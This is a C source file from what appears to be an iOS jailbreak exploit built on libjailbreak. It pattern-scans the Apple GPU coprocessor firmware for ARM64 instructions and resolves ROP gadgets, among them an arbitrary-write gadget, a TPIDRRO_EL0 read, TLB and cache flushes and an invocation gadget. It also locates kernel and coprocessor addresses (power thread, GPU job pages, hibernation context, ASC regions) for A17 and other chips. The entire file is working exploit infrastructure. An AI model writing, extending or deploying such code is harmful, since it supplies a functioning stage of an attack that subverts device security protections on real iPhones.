#include "gfx_patchfinder.h"
#include "titan.h"
#include "gfx.h"
#include "arm64.h"

#include <libjailbreak/libjailbreak.h>

#include <stdint.h>
#include <stdlib.h>

uint64_t gfx_patchfind(uint32_t insns[], uint32_t masks[], int insn_count) {
    uint64_t va = gTitanContext.gfx_text_mapping;
    while (va < gTitanContext.gfx_text_mapping + gTitanContext.gfx_text_size) {
        bool found = true;
        for (int i = 0; i < insn_count; i++) {
            uint32_t insn = *(uint32_t *)(va + (i * 4));
            if ((insn & masks[i]) != (insns[i] & masks[i])) {
                found = false;
                break;
            }
        }
        if (found) {
            return va - gTitanContext.gfx_text_mapping + gTitanContext.gfx_text_base;
        }
        va += 4;
    }
    return 0;
}

uint64_t gfx_find_power_thread(void) {
    uint32_t insns[4] = {
        0x528007C5, // MOV W5, #0x3E
        0x94000000, // BL
        0x90000000, // ADRP
        0xF9000000, // STR
    };
    uint32_t masks[4] = {
        0xFFFFFFFF,
        0xFC000000,
        0x9F000000,
        0xFFC0001F,
    };
    uint64_t mov = gfx_patchfind(insns, masks, 4);
    printf("Found power thread search at 0x%llX\n", mov);
    uint64_t adrp_addr = mov + 8;
    uint32_t adrp = gfx_read32(adrp_addr);
    uint32_t str = gfx_read32(adrp_addr + 4);
    uint64_t page = arm64_decode_adrp(adrp_addr, adrp);
    uint64_t thread_ptr = page + arm64_decode_ldr_str_off(str);
    uint64_t power_thread = gfx_read64(thread_ptr);
    return power_thread;
}

uint64_t gfx_find_tpidrro_el0_gadget(void) {
    uint32_t insn[1] = {
        0xD53BD061, // MRS X1, TPIDRRO_EL0
    };
    uint32_t mask[1] = {
        0xFFFFFFFF,
    };
    uint64_t addr = gfx_patchfind(insn, mask, 1);
    if (!addr) {
        printf("ERROR: failed to find TPIDRRO_EL0 gadget\n");
        return 0;
    }
    return addr;
}

uint64_t gfx_find_write_gadget(void) {
    uint32_t insns[2] = {
        0xF8226801, // STR X1, [X0, X2]
        0xD65F03C0, // RET
    };
    uint32_t masks[2] = {
        0xFFFFFFFF,
        0xFFFFFFFF,
    };
    return gfx_patchfind(insns, masks, 2);
}

uint64_t gfx_find_invocation_gadget(void) {
    uint32_t insn[1] = {
        0x910443E1, // MOV X1, SP, #0x110
    };
    uint32_t mask[1] = {
        0xFFFFFFFF,
    };
    return gfx_patchfind(insn, mask, 1);
}

uint64_t gfx_find_tlb_flush(void) {
    uint32_t insns[4] = {
        0xD508831F, // TLBI VMALLE1IS
        0xD5033F9F, // DSB SY
        0xD5033FDF, // ISB
        0xD65F03C0, // RET
    };
    uint32_t masks[4] = {
        0xFFFFFFFF,
        0xFFFFFFFF,
        0xFFFFFFFF,
        0xFFFFFFFF,
    };
    return gfx_patchfind(insns, masks, 4);
}

uint64_t gfx_find_empty_job(void) {
    uint64_t job_list = 0, job_list_end = 0;
    if (gTitanContext.soc == SOC_A17) {
        job_list = 0xFFFFFC2000020000;
        job_list_end = 0xFFFFFC200008C000;
    } else {
        job_list = 0xFFFFFFA000020000;
        job_list_end = 0xFFFFFFA00008C000;
    }
    uint64_t cur_va = job_list;
    uint8_t job_validity[27] = { 0 };
    memset(job_validity, 0, sizeof(job_validity));
    void *buffer = calloc(0x4000, 1);
    do {
        uint64_t cur_pa = gfx_vtophys(cur_va, NULL, true);
        if (!cur_pa) {
            job_validity[(cur_va - job_list) / 0x4000] = -1;
            cur_va += 0x4000;
            continue;
        }
        uint64_t mapping = 0;
        kmap(cur_pa, 0x4000, (void **)&mapping);
        if (!mapping) {
            printf("ERROR: failed to map job page at PA 0x%llX\n", cur_pa);
            free(buffer);
            return 0;
        }
        if (!memcmp(buffer, (void *)mapping, 0x4000)) {
            job_validity[(cur_va - job_list) / 0x4000] = 1;
        }
        cur_va += 0x4000;
    } while (cur_va < job_list_end);
    free(buffer);

    if (job_validity[13] == 1) {
        return job_list + (13 * 0x4000);
    }

    for (int i = 14; i < 27; i++) {
        if (job_validity[i] == 1) {
            return job_list + (i * 0x4000);
        }
    }

    for (int i = 12; i >= 0; i--) {
        if (job_validity[i] == 1) {
            return job_list + (i * 0x4000);
        }
    }

    return 0;
}

uint64_t gfx_find_arm_hibernate(void) {
    uint32_t insns[5] = {
        0xD503201F, // NOP
        0x58000000, // LDR X0, #?
        0xD503201F, // NOP
        0x58000001, // LDR X1, #?
        0x14000000, // B ?
    };
    uint32_t masks[5] = {
        0xFFFFFFFF,
        0xFF00001F,
        0xFFFFFFFF,
        0xFF00001F,
        0xFC000000,
    };
    return gfx_patchfind(insns, masks, 5);
}

uint64_t gfx_find_hibernation_context(void) {
    uint64_t nop = titan_function(arm_hibernate);
    uint32_t ldr = gfx_read32(nop + 4);
    uint64_t ldr_addr = nop + 4;
    uint64_t __hb_context = ldr_addr + arm64_decode_ldr_literal_off(ldr);
    uint64_t arm_hb_context = gfx_read64(__hb_context);
    return arm_hb_context;
}

uint64_t gfx_find_cache_flush(void) {
    uint32_t insn[3] = {
        0xD5033F9F, // DSB SY
        0xD5033FDF, // ISB
        0xD65F03C0, // RET
    };
    uint32_t mask[3] = {
        0xFFFFFFFF,
        0xFFFFFFFF,
        0xFFFFFFFF,
    };
    return gfx_patchfind(insn, mask, 3);
}

uint64_t gfx_find_spin(void) {
    uint32_t insn[1] = {
        0x14000000, // B .
    };
    uint32_t mask[1] = {
        0xFFFFFFFF,
    };
    return gfx_patchfind(insn, mask, 1);
}

uint64_t gfx_find_arm_arch_resume(void) {
    uint32_t insns[3] = {
        0xD53800A2, // MRS X2, MPIDR_EL1
        0x00000000,
        0xAA0003E5, // MOV X5, X0
    };
    uint32_t masks[3] = {
        0xFFFFFFFF,
        0x00000000,
        0xFFFFFFFC, // On iOS 16, it's MOV X6, X0
    };
    return gfx_patchfind(insns, masks, 3);
}

uint64_t gfx_find_arm_hb_context(void) {
    uint64_t arm_arch_resume = gfx_find_arm_arch_resume();
    uint64_t ldr_addr = arm_arch_resume + 12;
    uint32_t ldr = gfx_read32(ldr_addr);
    while ((ldr & 0xFC000000) != 0x58000000) {
        ldr_addr += 4;
        ldr = gfx_read32(ldr_addr);
    }
    uint64_t arm_hb_context_addr_ptr = ldr_addr + arm64_decode_ldr_literal_off(ldr);
    return gfx_read64(arm_hb_context_addr_ptr);
}

int gfx_pf_run(void) {
    titan_function(arm_hibernate) = gfx_find_arm_hibernate();
    printf("Found arm_hibernate at 0x%llX\n", titan_function(arm_hibernate));

    titan_gadget(tpidrro_el0) = gfx_find_tpidrro_el0_gadget();
    printf("Found TPIDRRO_EL0 gadget at 0x%llX\n", titan_gadget(tpidrro_el0));
    titan_gadget(write) = gfx_find_write_gadget();
    printf("Found STR X1, [X0, X2] gadget at 0x%llX\n", titan_gadget(write));
    titan_gadget(rop_invoke) = gfx_find_invocation_gadget();
    printf("Found ROP invocation gadget at 0x%llX\n", titan_gadget(rop_invoke));
    titan_gadget(tlb_flush) = gfx_find_tlb_flush();
    printf("Found TLB flush gadget at 0x%llX\n", titan_gadget(tlb_flush));
    titan_gadget(cache_flush) = gfx_find_cache_flush();
    printf("Found cache flush gadget at 0x%llX\n", titan_gadget(cache_flush));
    titan_gadget(spin) = gfx_find_spin();
    printf("Found spin gadget at 0x%llX\n", titan_gadget(spin));

    titan_address(power_thread) = gfx_find_power_thread();
    printf("Found power thread at 0x%llX\n", titan_address(power_thread));
    titan_address(target_job) = gfx_find_empty_job();
    printf("Found target job at 0x%llX\n", titan_address(target_job));
    titan_address(hibernation_context) = gfx_find_hibernation_context();
    printf("Found hibernation context at 0x%llX\n", titan_address(hibernation_context));
    titan_address(arm_hb_context) = gfx_find_arm_hb_context();
    printf("Found arm_hb_context at 0x%llX\n", titan_address(arm_hb_context));

    if (gTitanContext.soc == SOC_A17) {
        titan_address(job_list) = 0xFFFFFC2000000000;
        titan_address(asc_impl) = 0xFFFFFC1100160000;
        titan_address(asc_dbg) = 0xFFFFFC1100170000;
        titan_address(gfx_new_mapping_va) = 0xFFFFFC7000000000;
    } else {
        titan_address(job_list) = 0xFFFFFFA000000000;
        titan_address(asc_impl) = 0xFFFFFF9100160000;
        titan_address(asc_dbg) = 0xFFFFFF9100170000;
        titan_address(gfx_new_mapping_va) = 0xFFFFFFF000000000;
    }

    return 0;
}
